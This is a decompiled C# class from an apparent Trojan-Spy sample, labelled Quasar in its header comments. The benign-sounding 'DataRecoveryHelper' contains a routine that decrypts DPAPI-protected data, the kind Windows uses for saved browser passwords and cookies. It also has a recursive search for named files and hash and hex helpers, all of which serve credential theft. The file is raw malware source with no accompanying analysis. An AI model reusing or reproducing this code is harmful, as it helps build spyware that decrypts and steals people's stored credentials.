// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.DataRecoveryHelper
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace NoiseMe.Drags.App.Models
{
  public static class DataRecoveryHelper
  {
    public static string GetMd5Hash(string source) => DataRecoveryHelper.GetHexString((IList<byte>) new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(source)));

    private static string GetHexString(IList<byte> bt)
    {
      string hexString = string.Empty;
      for (int index = 0; index < bt.Count; ++index)
      {
        int num1 = (int) bt[index];
        int num2 = num1 & 15;
        int num3 = num1 >> 4 & 15;
        string str = num3 <= 9 ? hexString + num3.ToString((IFormatProvider) CultureInfo.InvariantCulture) : hexString + ((char) (num3 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        hexString = num2 <= 9 ? str + num2.ToString((IFormatProvider) CultureInfo.InvariantCulture) : str + ((char) (num2 - 10 + 65)).ToString((IFormatProvider) CultureInfo.InvariantCulture);
        if (index + 1 != bt.Count && (index + 1) % 2 == 0)
          hexString += "-";
      }
      return hexString;
    }

    public static byte[] ConvertHexStringToByteArray(string hexString)
    {
      byte[] byteArray = hexString.Length % 2 == 0 ? new byte[hexString.Length / 2] : throw new ArgumentException(string.Format((IFormatProvider) CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", new object[1]
      {
        (object) hexString
      }));
      for (int index = 0; index < byteArray.Length; ++index)
      {
        string s = hexString.Substring(index * 2, 2);
        byteArray[index] = byte.Parse(s, NumberStyles.HexNumber, (IFormatProvider) CultureInfo.InvariantCulture);
      }
      return byteArray;
    }

    public static string DecryptBlob(
      string EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      return DataRecoveryHelper.DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
    }

    public static string DecryptBlob(
      byte[] EncryptedData,
      DataProtectionScope dataProtectionScope,
      byte[] entropy = null)
    {
      try
      {
        return EncryptedData == null || EncryptedData.Length == 0 ? string.Empty : Encoding.UTF8.GetString(ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope));
      }
      catch (CryptographicException ex)
      {
        return string.Empty;
      }
      catch (Exception ex)
      {
        return string.Empty;
      }
    }

    public static List<string> FindPaths(
      string baseDirectory,
      int maxLevel = 4,
      int level = 1,
      params string[] files)
    {
      List<string> paths = new List<string>();
      if (files == null || files.Length == 0 || level > maxLevel)
        return paths;
      foreach (string directory in Directory.GetDirectories(baseDirectory))
      {
        try
        {
          DirectoryInfo directoryInfo = new DirectoryInfo(directory);
          FileInfo[] files1 = directoryInfo.GetFiles();
          bool flag = false;
          for (int index1 = 0; index1 < files1.Length && !flag; ++index1)
          {
            for (int index2 = 0; index2 < files.Length && !flag; ++index2)
            {
              string file = files[index2];
              FileInfo fileInfo = files1[index1];
              string name = fileInfo.Name;
              if (file == name)
              {
                flag = true;
                paths.Add(fileInfo.FullName);
              }
            }
          }
          foreach (string path in DataRecoveryHelper.FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
          {
            if (!paths.Contains(path))
              paths.Add(path);
          }
        }
        catch
        {
        }
      }
      return paths;
    }
  }
}
